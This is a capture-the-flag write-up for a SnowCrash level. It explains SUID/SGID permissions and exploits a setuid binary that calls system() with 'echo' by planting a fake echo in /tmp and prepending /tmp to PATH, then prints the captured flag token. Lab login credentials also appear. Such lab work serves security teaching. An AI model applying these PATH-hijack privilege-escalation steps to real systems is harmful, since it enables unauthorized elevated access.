
ssh level03@10.12.100.98 -p 4242
pwd: kooda2puivaav1idi4f57q8iq

In the home we found a binary file `level03`

first thing to notice when `ls`-ing the dir are the file permissions:
`rwsr-sr-x`
**owner**: has read, write, [SUID permissions](https://www.zzee.com/solutions/linux-permissions.shtml)
**group**: read and SGID permissions

```

the setguid bit set = if the file were executed, that it would be 
run with the effective rights of the group owner (instead of that of
the user who executed it) aka : you inherit the permissions of that 
program's owner.

On a directory, the setgid bit means that, if a file is created in 
the directory, its group-owner would be that of the directory 
(instead of that of the user who created it).   

```
[StackOverflow](https://stackoverflow.com/questions/9129959/how-to-set-a-file-to-this-drwxrwsrwx-permission-on-ubuntu#:~:text=The%20group%20owner%20permissions%20in,is%20the%20s%20in%20rws%20)

if we execute `./level03`, it outputs the msg: `Exploit me`

```
strings level03
    /usr/bin/env echo Exploit me
```
tracing the call of the executable either with strings or ltrace ull notice:

`system("/usr/bin/env echo Exploit me")`

u could check [this thread](https://stackoverflow.com/questions/8304396/what-is-vulnerable-about-this-c-code/8304447) on StackOverflow

Whenever user type some command in shell, it first search that command in the list of directories mentioned in PATH environment variable. {[Quora](https://www.quora.com/How-are-commands-executed-in-Linux)}


so on the system function call we can override the behavior of echo to inject our getflag command which is built-in /bin/getflag 

`echo "/bin/getflag" > /tmp/echo && chmod +x /tmp/echo && PATH=/tmp:$PATH`

```
 echo "echo getflag" > /tmp/echo
 chmod 777 /tmp/echo
 export PATH=/tmp:$PATH
```


```
 ./level03
    token : qi0maab88jeaj46qoumi7maus
 ```

 Echo Command -1st Technique to spawn root privilege
https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/

Copy Command -2nd Technique to spawn root privilege

cp /bin/getflag /tmp/echo
export PATH=/tmp:$PATH
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus


Symlink command -3rd Technique to spawn root privilege
ln -s /bin/getflag /tmp/echo